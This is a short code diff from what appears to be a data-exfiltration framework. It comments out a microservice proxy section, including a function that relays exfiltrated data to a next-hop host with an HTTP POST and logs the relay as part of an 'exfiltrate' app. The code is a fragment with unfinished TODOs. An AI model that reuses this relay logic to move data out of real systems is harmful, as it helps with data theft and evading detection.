@@ -123,7 +123,7 @@ def proxy():
     ## (but in an automated way...)
 ## todo: write new ms_sender function or something like that
 ## todo: TEST!!!
-
+'''
 def microserivce_proxy(exfil_object):
     global app
     app = exfil_object
@@ -181,7 +181,7 @@ def relay_ms_request(data):
     target = "http://{}:{}".format(next_ip, next_port)
     app_exfiltrate.log_message('info', "[proxy] [http] Relaying {0} bytes to {1}".format(len(data), target))
     requests.post(target, data=data_to_send, headers=headers)
-
+'''
 ###########################################################
 ###########################################################
 
